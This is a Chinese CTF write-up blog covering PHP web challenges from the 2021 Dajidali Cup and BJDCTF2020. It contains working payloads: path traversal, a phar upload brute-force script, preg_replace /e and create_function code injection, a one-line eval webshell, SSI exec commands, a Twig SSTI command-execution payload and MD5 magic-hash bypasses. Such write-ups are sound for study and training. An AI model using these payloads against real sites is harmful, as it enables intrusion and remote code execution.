先说说php://input传参的问题，当直接poststr=xxxx的时候可以直接传入变量str，但是当poststr=xxx\u0026amp;pass_word=xxx的时候，php://input会将这一整串赋值给str，因为其中有下划线，所以无法绕过，测试如下：\n上网查找相关资料，发现：\n1 2 3 1.Coentent-Type仅在取值为application/x-www-data-urlencoded和multipart/form-data两种情况下，PHP才会将http请求数据包中相应的数据填入全局变量$_POST 2.只有Coentent-Type为multipart/form-data的时候，PHP不会将http请求数据包中的相应数据填入php://input，否则其它情况都会。 也就是说，Coentent-Type为multipart/form-data时，php://input为空而$_POST不为空，从而绕过该正则。至于如何传呢，我是使用插件Tabbed Postman - REST Client，其他的方法我也不会（菜）\n反序列化 刚开始觉得filter函数吞掉了俩字符，会导致反序列无法正常进行，后面发现，这个filter函数过滤了个寂寞。。。\n正常情况下压根儿就没有ctfshowup给他进行替换。。。所以直接以form-data，post一个pass_word=ctfshowvip即可，user_name随便填\n可能是出题没想到这个非预期吧\nveryphp 也是一道php代码审计，源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); include(\u0026#34;config.php\u0026#34;); class qwq { function __wakeup(){ die(\u0026#34;Access Denied!\u0026#34;); } static function oao(){ show_source(\u0026#34;config.php\u0026#34;); } } $str = file_get_contents(\u0026#34;php://input\u0026#34;); if(preg_match(\u0026#39;/\\`|\\_|\\.|%|\\*|\\~|\\^|\\\u0026#39;|\\\u0026#34;|\\;|\\(|\\)|\\]|g|e|l|i|\\//is\u0026#39;,$str)){ die(\u0026#34;I am sorry but you have to leave.\u0026#34;); }else{ extract($_POST); } if(isset($shaw_root)){ if(preg_match(\u0026#39;/^\\-[a-e][^a-zA-Z0-8]\u0026lt;b\u0026gt;(.*)\u0026gt;{4}\\D*?(abc.*?)p(hp)*\\@R(s|r).$/\u0026#39;, $shaw_root)\u0026amp;\u0026amp; strlen($shaw_root)===29){ echo $hint; }else{ echo \u0026#34;Almost there.\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } }else{ echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;.\u0026#34;Input correct parameters\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; die(); } if($ans===$SecretNumber){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;.\u0026#34;Congratulations!\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; call_user_func($my_ans); } php://input 与 $_POST 传参问题与上一题一样，这里就不再赘述了。\n正则 绕了半天不知道这个正则想匹配些啥（可能是我太菜了），不过最后总算是绕过去了，学习正则的话可以参考这篇文章：正则表达式30分钟入门教程，最后给出$shaw_root的值：-a9\u0026lt;b\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;abcaaaaaaaa.php@Rr.。\n$SecretNumber 绕过正则之后得到一个hint：Here is a hint : md5(\u0026quot;shaw\u0026quot;.($SecretNumber).\u0026quot;root\u0026quot;)==166b47a5cb1ca2431a0edfcef200684f \u0026amp;\u0026amp; strlen($SecretNumber)===5，感觉出题人是想让我们根据这个hint把SecretNumber爆出来，但是这里两个变量都可控，应该是被非预期了。。。\ncall_user_func 又是一个变量的call_user_func。。。上回我盯着phpinfo看了大半天。。。这次也是先传入一个phpinfo找找，但是并没发现什么可疑的东西，然后又搜了下flag，也没找到。然后这时候想起最前面的qwq类以及其静态方法，刚开始直接传入my_ans=oao，但是发现行不通。。。于是去Google了一下call_user_func如何调用类的静态方法：\n因为oao函数没有参数，所以可以传入my_ans数组从而调用该静态方法，最后payload：\n虎山行\u0026amp;revenge 这题真的不会，之前也没有做过phar的反序列化，基本上都是靠着各种wp和资料复现的。\n打开之后有个hint：\n访问之后：\n安装看看：\n假装自己扫了一下目录：\n拿到源码之后先拿d盾扫一下：\n好像没啥用，后面同学和我说可以传file直接目录穿越（审计源码能力太差了）：\n然后打开：/ctfshowsecretfilehh：\n利用/mc-admin/page-edit.php?file=../../../../../../../var/www/html/ctfshowsecretfilehh/waf.php读取waf.php源码:\n1 2 3 4 5 6 7 8 \u0026lt;?php function waf($file){ if (preg_match(\u0026#34;/^phar|smtp|dict|zip|compress|file|etc|root|filter|php|flag|ctf|hint|\\.\\.\\//i\u0026#34;,$file)){ die(\u0026#34;姿势太简单啦，来一点骚的？！\u0026#34;); }else{ return $file; } } 再用/mc-admin/page-edit.php?file=../../../upload.php读取upload.php的源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;?php error_reporting(0); // 允许上传的图片后缀 $allowedExts = array(\u0026#34;gif\u0026#34;, \u0026#34;jpg\u0026#34;, \u0026#34;png\u0026#34;); $temp = explode(\u0026#34;.\u0026#34;, $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]); // echo $_FILES[\u0026#34;file\u0026#34;][\u0026#34;size\u0026#34;]; $extension = end($temp); // 获取文件后缀名 if ((($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/gif\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/jpeg\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/png\u0026#34;)) \u0026amp;\u0026amp; ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;size\u0026#34;] \u0026lt; 2048000) // 小于 2000kb \u0026amp;\u0026amp; in_array($extension, $allowedExts)) { if ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;error\u0026#34;] \u0026gt; 0) { echo \u0026#34;文件出错: \u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;error\u0026#34;] . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } else { if (file_exists(\u0026#34;upload/\u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;])) { echo $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;] . \u0026#34; 文件已经存在。 \u0026#34;; } else { $md5_unix_random =substr(md5(time()),0,8); $filename = $md5_unix_random.\u0026#39;.\u0026#39;.$extension; move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;], \u0026#34;upload/\u0026#34; . $filename); echo \u0026#34;上传成功,文件存在upload/\u0026#34;; } } } else { echo \u0026#34;文件类型仅支持jpg、png、gif等图片格式\u0026#34;; } ?\u0026gt; 这里直接参考yu22x师傅博客里的脚本找上传的文件名\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import requests import time import hashlib def geturl(s): a=hashlib.md5(str(int(s)).encode()).hexdigest() return \u0026#34;http://b8876a9e-71b3-4a02-b8c4-80f02ec058a5.chall.ctf.show/upload/\u0026#34;+a[:8]+\u0026#39;.gif\u0026#39; #coding:utf-8 while True: url=\u0026#34;http://b8876a9e-71b3-4a02-b8c4-80f02ec058a5.chall.ctf.show/upload.php\u0026#34; files={\u0026#39;file\u0026#39;:(\u0026#39;exp.gif\u0026#39;, open(\u0026#39;exp.gif\u0026#39;,\u0026#39;rb\u0026#39;), \u0026#39;image/gif\u0026#39; )} r=requests.post(url,files=files) print(r.text) a=time.time() r2=requests.get(geturl(a)) r3=requests.get(geturl(a-1))#存在延时多试几个时间 if(\u0026#34;我的网站\u0026#34; not in r2.text or \u0026#34;我的网站\u0026#34; not in r3.text): print(geturl(a)) print(geturl(a-1)) break else: time.sleep(0.3) 先在/uplaod上传一个phar文件（后缀名已改为gif），然后再用该脚本找文件名：\n然后访问hint.txt:\n访问/ctfshowgetflaghhhh：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php show_source(__FILE__); $unser = $_GET[\u0026#39;unser\u0026#39;]; class Unser { public $username=\u0026#39;Firebasky\u0026#39;; public $password; function __destruct() { if($this-\u0026gt;username==\u0026#39;ctfshow\u0026#39;\u0026amp;\u0026amp;$this-\u0026gt;password==(int)md5(time())){ system(\u0026#39;cp /ctfshow* /var/www/html/flag.txt\u0026#39;); } } } $ctf=@unserialize($unser); system(\u0026#39;rm -rf /var/www/html/flag.txt\u0026#39;); 因为md5之后有一个强制类型转换，所以当md值是字母开头的时候会变成0，所以我们可以令password为0，然后多试几次既可：\n后面有个system('rm -rf /var/www/html/flag.txt');删掉flag，理论上需要条件竞争，但是不知道为啥狂点了几次hackbar的EXECUTE之后就可以直接url访问。。。。迷\nrevenge只有路由的名字不一样，不知道有啥意义。。。迷\n","date":"2021-01-24T17:01:00+08:00","permalink":"https://k1te.cn/p/2021%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E6%9D%AF/","title":"2021大吉大利杯"},{"content":"BJDCTF2020 wp 在buuoj上面复现的wp，有一些是自己做出来的，有一些是看了wp才做出来了，依然很菜。\nEasy MD5 打开网址之后，在响应标头中找到了hint：\n1 select * from \u0026#39;admin\u0026#39; where password = md5($pass,true) 理论上md5的密码验证是很难破解的，但是这里MD5函数的第二个参数设为true就有漏洞。\n1 2 3 4 md5(\u0026#34;hello\u0026#34;); \u0026gt;\u0026gt;5d41402abc4b2a76b9719d911017c592 md5(\u0026#34;hello\u0026#34;,true); \u0026gt;\u0026gt;]A@*�K*v�q��\u0010\u0017Œ 32字符十六进制数很好理解，16进制字符二进制格式并非真的二进制，二十将十六进制数两个一组，转化成ASCII字符，如，5d =》],41=\u0026gt;A\n因此可以输入特定的字符串，使得md5之后的raw_output中含有or。网上找到了两个：\n1 2 3 4 5 md5(\u0026#34;ffifdyop\u0026#34;,true); \u0026gt;\u0026gt;\u0026#39;or\u0026#39;6�]��!r,��b\u001c md5(\u0026#34;129581926211651571912466741651878684928\u0026#34;,true); \u0026gt;\u0026gt;\u0006�T0D��o#��\u0026#39;or\u0026#39;8 //第二个在该题中无效 第二层是MD5碰撞：\n1 2 3 4 5 6 7 \u0026lt;!-- $a = $GET[\u0026#39;a\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; if($a != $b \u0026amp;\u0026amp; md5($a) == md5($b)){ // wow, glzjin wants a girl friend. --\u0026gt; 因为使用的是!=和==弱类型比较而不是！==和===这种强类型比较，弱类型比较会将‘0E’开头的哈希值解释为科学计数法，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。\n符合条件的一些MD5值：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 纯数字类： s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 大写字母类： QLTHNDT 0e405967825401955372549139051580 QNKCDZO 0e830400451993494058024219903391 EEIZDOI 0e782601363539291779881938479162 TUFEPMC 0e839407194569345277863905212547 UTIPEZQ 0e382098788231234954670291303879 UYXFLOI 0e552539585246568817348686838809 IHKFRNS 0e256160682445802696926137988570 PJNPDWY 0e291529052894702774557631701704 ABJIHVY 0e755264355178451322893275696586 DQWRASX 0e742373665639232907775599582643 DYAXWCA 0e424759758842488633464374063001 GEGHBXL 0e248776895502908863709684713578 GGHMVOE 0e362766013028313274586933780773 GZECLQZ 0e537612333747236407713628225676 NWWKITQ 0e763082070976038347657360817689 NOOPCJF 0e818888003657176127862245791911 MAUXXQC 0e478478466848439040434801845361 MMHUWUV 0e701732711630150438129209816536 然后是第三层：\n1 2 3 4 5 6 7 8 9 \u0026lt;?php error_reporting(0); include \u0026#34;flag.php\u0026#34;; highlight_file(__FILE__); if($_POST[\u0026#39;param1\u0026#39;]!==$_POST[\u0026#39;param2\u0026#39;]\u0026amp;\u0026amp;md5($_POST[\u0026#39;param1\u0026#39;])===md5($_POST[\u0026#39;param2\u0026#39;])){ echo $flag; } 第三层可以用数组绕过，由于：\n1 2 3 $a[] = 1; echo md5($a) === null; \u0026gt;\u0026gt;1 故：\nMark loves cat 这道题看了很久，刚看到message以及get的时候觉得是xss，但是搞不定，然后去看wp，发现是git源码泄露，然而buu的web用dirsearch扫描的时候永远是429-Too Many Requests\u0026hellip;\u0026hellip;.\n知道是git源码泄露之后用githack下载：\nindex.php:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php include \u0026#39;flag.php\u0026#39;; $yds = \u0026#34;dog\u0026#34;; $is = \u0026#34;cat\u0026#34;; $handsome = \u0026#39;yds\u0026#39;; foreach($_POST as $x =\u0026gt; $y){ $$x = $y; } foreach($_GET as $x =\u0026gt; $y){ $$x = $$y; } foreach($_GET as $x =\u0026gt; $y){ if($_GET[\u0026#39;flag\u0026#39;] === $x \u0026amp;\u0026amp; $x !== \u0026#39;flag\u0026#39;){ exit($handsome); } } if(!isset($_GET[\u0026#39;flag\u0026#39;]) \u0026amp;\u0026amp; !isset($_POST[\u0026#39;flag\u0026#39;])){ exit($yds); } if($_POST[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39; || $_GET[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39;){ exit($is); } echo \u0026#34;the flag is: \u0026#34;.$flag; 这个可变变量把我给绕晕了。。。可以看看L\u0026rsquo;Amore大佬的wp\nZJCTF，不过如此 看了看题目，应该是zjctf某道题的改编，首先找到zjctf的题目。\n第一层是一样的，使用data://绕过。payload：\n?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=\n接着看到include函数想到文件包含。\npayload：?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=\u0026amp;file=php://filter/read=convert.base64-encode/resource=next.php\n将base64解码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php $id = $_GET[\u0026#39;id\u0026#39;]; $_SESSION[\u0026#39;id\u0026#39;] = $id; function complex($re, $str) { return preg_replace( \u0026#39;/(\u0026#39; . $re . \u0026#39;)/ei\u0026#39;, \u0026#39;strtolower(\u0026#34;\\\\1\u0026#34;)\u0026#39;, $str ); } foreach($_GET as $re =\u0026gt; $str) { echo complex($re, $str). \u0026#34;\\n\u0026#34;; } function getFlag(){ @eval($_GET[\u0026#39;cmd\u0026#39;]); } 刚开始发现getFlag函数定义了没有执行，猜测是使用complex函数来执行这个函数，但是看了好久还是没思路。。。\n然后看了wp才知道preg_replace在/e模式下的RCE\n深入研究preg_replace与代码执行\npayload：?\\S*=${getflag()}\u0026amp;cmd=system('cat /flag');\n当然，都RCE了，也可以一句话木马直接上蚁剑\n?\\S*=${eval($_POST[kite])}\nEasySearch 看到题目的search想到源码泄露，访问index.php.swp得到部分源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;?php ob_start();\tfunction get_hash(){ $chars = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^\u0026amp;*()+-\u0026#39;; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); } header(\u0026#34;Content-Type: text/html;charset=utf-8\u0026#34;); *** if(isset($_POST[\u0026#39;username\u0026#39;]) and $_POST[\u0026#39;username\u0026#39;] != \u0026#39;\u0026#39; ) { $admin = \u0026#39;6d0bc1\u0026#39;; if ( $admin == substr(md5($_POST[\u0026#39;password\u0026#39;]),0,6)) { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;[+] Welcome to manage system\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; $file_shtml = \u0026#34;public/\u0026#34;.get_hash().\u0026#34;.shtml\u0026#34;; $shtml = fopen($file_shtml, \u0026#34;w\u0026#34;) or die(\u0026#34;Unable to open file!\u0026#34;); $text = \u0026#39; *** *** \u0026lt;h1\u0026gt;Hello,\u0026#39;.$_POST[\u0026#39;username\u0026#39;].\u0026#39;\u0026lt;/h1\u0026gt; *** ***\u0026#39;; fwrite($shtml,$text); fclose($shtml); *** echo \u0026#34;[!] Header error ...\u0026#34;; } else { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;[!] Failed\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; }else { *** } *** ?\u0026gt; 第一层直接爆破：\n自己写的垃圾脚本：\n1 2 3 4 5 6 7 8 9 \u0026lt;?php for($i = 0;$i \u0026lt; 9999999999; $i++){ if (substr(md5($i),0,6) == \u0026#34;6d0bc1\u0026#34;) { echo \u0026#34;yes\u0026#34;.\u0026#34;\\n\u0026#34;.$i; return; } if ($i%1000000 == 0) echo \u0026#34;***\u0026#34;.\u0026#34;\\n\u0026#34;; } 登陆成功:\n在响应标头里找到随机生成的url：\n打开：\n然后是一个新的知识点：Apache 开启SSI配置使shtml支持 include()和SSI Shell漏洞问题\n本题中没有过滤，直接在username里打就可以了：\n\u0026lt;!--#exec cmd=\u0026quot;ls ../\u0026quot;--\u0026gt;\n\u0026lt;!--#exec cmd=\u0026quot;cat ../flag_990c66bf85a09c664f0b6741840499b2\u0026quot;--\u0026gt;\nCookie is so stable 老图了：\n依次测试： ${7*7}，返回${7*7}，不通过；测试{{7*7}}，返回49，通过；测试 {{7*'7'}}，返回49,判断模板为twig(如果是jinja2返回7777777，并且twig是php，jinja是python)\n知识点链接：一篇文章带你理解漏洞之SSTI漏洞/#2-Twig\nhint:\n根据文章得到payload：\n1 {{_self.env.registerUndefinedFilterCallback(\u0026#34;exec\u0026#34;)}}{{_self.env.getFilter(\u0026#34;cat /flag\u0026#34;)}} 得到flag：\nEzPHP ez不一定ez，但是hard是真的hard\nhint：\nbase32解码：\n得到源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); $file = \u0026#34;1nD3x.php\u0026#34;; $shana = $_GET[\u0026#39;shana\u0026#39;]; $passwd = $_GET[\u0026#39;passwd\u0026#39;]; $arg = \u0026#39;\u0026#39;; $code = \u0026#39;\u0026#39;; echo \u0026#34;\u0026lt;br /\u0026gt;\u0026lt;font color=red\u0026gt;\u0026lt;B\u0026gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!\u0026lt;/B\u0026gt;\u0026lt;br\u0026gt;\u0026lt;/font\u0026gt;\u0026#34;; if($_SERVER) { if ( preg_match(\u0026#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\u0026#34;|\\\u0026#39;|log/i\u0026#39;, $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]) ) die(\u0026#39;You seem to want to do something bad?\u0026#39;); } if (!preg_match(\u0026#39;/http|https/i\u0026#39;, $_GET[\u0026#39;file\u0026#39;])) { if (preg_match(\u0026#39;/^aqua_is_cute$/\u0026#39;, $_GET[\u0026#39;debu\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;debu\u0026#39;] !== \u0026#39;aqua_is_cute\u0026#39;) { $file = $_GET[\u0026#34;file\u0026#34;]; echo \u0026#34;Neeeeee! Good Job!\u0026lt;br\u0026gt;\u0026#34;; } } else die(\u0026#39;fxck you! What do you want to do ?!\u0026#39;); if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match(\u0026#39;/[a-zA-Z]/i\u0026#39;, $value)) die(\u0026#39;fxck you! I hate English!\u0026#39;); } } if (file_get_contents($file) !== \u0026#39;debu_debu_aqua\u0026#39;) die(\u0026#34;Aqua is the cutest five-year-old child in the world! Isn\u0026#39;t it ?\u0026lt;br\u0026gt;\u0026#34;); if ( sha1($shana) === sha1($passwd) \u0026amp;\u0026amp; $shana != $passwd ){ extract($_GET[\u0026#34;flag\u0026#34;]); echo \u0026#34;Very good! you know my password. But what is flag?\u0026lt;br\u0026gt;\u0026#34;; } else{ die(\u0026#34;fxck you! you don\u0026#39;t know my password! And you don\u0026#39;t know sha1! why you come here!\u0026#34;); } if(preg_match(\u0026#39;/^[a-z0-9]*$/isD\u0026#39;, $code) || preg_match(\u0026#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\\u0026amp;|\\$|\\*|\\||\\\u0026lt;|\\\u0026#34;|\\\u0026#39;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i\u0026#39;, $arg) ) { die(\u0026#34;\u0026lt;br /\u0026gt;Neeeeee~! I have disabled all dangerous functions! You can\u0026#39;t get my flag =w=\u0026#34;); } else { include \u0026#34;flag.php\u0026#34;; $code(\u0026#39;\u0026#39;, $arg); } ?\u0026gt; 先看一下第一层过滤：有关$_SERVER的知识\n所以本题中$_SERVER[\u0026lsquo;QUERY_STRING\u0026rsquo;]过滤的是get的参数，直接用url编码绕过即可，有一个小坑就是：一般网上的在线url编码/解码不会对字母数字进行编码，因为：\n\u0026ldquo;\u0026hellip;Only alphanumerics [0-9a-zA-Z], the special characters \u0026ldquo;$-.+!*\u0026rsquo;(),\u0026rdquo; [not including the quotes - ed], and reserved characters used for their reserved purposes may be used unencoded within a URL.\u0026rdquo;\n\u0026ldquo;只有字母和数字[0-9a-zA-Z]、一些特殊符号\u0026rdquo;$-_.+!*\u0026rsquo;(),\u0026quot;[不包括双引号]、以及某些保留字，才可以不经过编码直接用于URL。\u0026quot;\n一般来说这些字符的url编码就是ascii码前面加个%,具体参考：https://www.w3school.com.cn/tags/html_ref_urlencode.htm\n第二层过滤又要在debu中正则匹配到\u0026quot;aqua_is_cute\u0026quot;并且用^和$卡住了两端，又要求debu !== \u0026ldquo;aqua_is_cute\u0026rdquo; ，看似不可能，但是结尾没有/D的话，$会省略句尾的%0a。所以只需要传入\n1 debu=aqua_is_cute%0a 再url编码一下：\n1 %64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a 第三层过滤是看看$_REQUEST中有没有英文字母，即使是url编码，因为是16进制，所以依然会有英文字母的出现，这里涉及到$_REQUEST的一个特性(bug)：当GET和POST都存在同一个变量名的时候，只获取POST中的值，所以可以通过这个特性来绕过正则的匹配。如图：\n第四层：if (file_get_contents($file) !== 'debu_debu_aqua')就是要在$file中写入“debu_debu_aqua”，可以用php://input或者data://text/plain,(url编写内容)绕过，参考：PHP file_get_contents 绕过\n第五层：PHP 中的sha1()和MD5()函数漏洞\n当传入?shana[]\u0026amp;passwd[]=123时，他俩的sha1都为null，但是两者不相等。\n第六层，也是最后一层了。\n参考：代码审计从入门到放弃(一) \u0026amp; function\n从参考文章可知，\u0026amp;5c即\\打头时可以正常运行var_dump()，但是。。。本题中变量code和arg没办法get。。。\n然后我发现在sha1过滤的地方会执行一个extract函数（刚开始还没看见，找了好久。。。）这是一个经典的变量覆盖的问题。\n不过也有个小坑，就是刚开始不知道如何变量覆盖，网上的资料基本都是extract($_GET); ，直接传入code=xxx\u0026amp;arg=xxx即可；这里的extract($_GET[\u0026quot;flag\u0026quot;]); 需要传入flag[code]=xxx\u0026amp;flag[arg]=xxx\n输入flag[code]=%5cvar_dump\u0026amp;flag[arg]=23333（url编码之后为：%66%6c%61%67%5b%63%6f%64%65%5d=%5c%76%61%72%5f%64%75%6d%70\u0026amp;%66%6c%61%67%5b%61%72%67%5d=2333）进行测试:\n灏卞湪杩欓噷锛屼綘鑳芥嬁鍒板畠鍚楋紵\nF12：\n到这里思路就断了，以为这些生僻字是flag，但是看了wp之后才发现不是。在$code('', $arg);处没有执行任何指令，我还以为被ban的函数这么多，不需要绕过，以及include了flag.php，以及出现了flag字样，导致我以为flag出了，后面是个misc。\n顺着wp的思路往下：因为include了flag.php，所以可以用get_defined_vars()将所有变量dump出来\n本来想试试能不能不利用create_function直接dump，后面发现不行：\n因为此时执行的是var_dump('','get_defined_vars()')，所以还是得利用create_function，原理解析：[科普向] 解析create_function() \u0026amp;\u0026amp; 复现wp\n构造payload：\n1 2 flag[code]=create_function\u0026amp;flag[arg]=}var_dump(get_defined_vars());// url编码之后为：%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e\u0026amp;%66%6c%61%67%5b%61%72%67%5d=%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f （刚开始以为过滤了},但是仔细看看发现只过滤了{。。。以及，为什么code不需要%5c）\n将所有变量dump出来之后发现提示真正的flag在rea1fl4g.php\n因为过滤了include，所以可以用require代替include，将rea1fl4g.php包含进来，并且过滤了·，可以用base64绕过\npayload：\n1 2 3 4 flag[code]=create_function\u0026amp;flag[arg]=}require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());// cmVhMWZsNGcucGhw:rea1fl4g.php的base64编码 url编码之后为： %66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e\u0026amp;%66%6c%61%67%5b%61%72%67%5d=%7d%72%65%71%75%69%72%65%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%63%6d%56%68%4d%57%5a%73%4e%47%63%75%63%47%68%77%29%29%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f 然后得到了一个假的flag：（脸上笑嘻嘻\n根据wp，预期解是取反绕过：\npayload：\n1 flag[code]=create_function\u0026amp;flag[arg]=}require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));// 最后终于拿到flag：\nThe mystery of ip 首先找到hint：\n顺着hint随便找了篇文章：php获取客户端IP地址的几种方法\n测试了一下发现是XFF：\n因为先做了Cookie is so stable这一题，两个页面差不多，连hint的位置都一样，所以先考虑SSTI：\n根据上面的图最后测试出来是Smarty：\n网上搜payload直接打：\n","date":"2020-09-28T14:42:08+08:00","permalink":"https://k1te.cn/p/bjdctf2020/","title":"BJDCTF2020"}]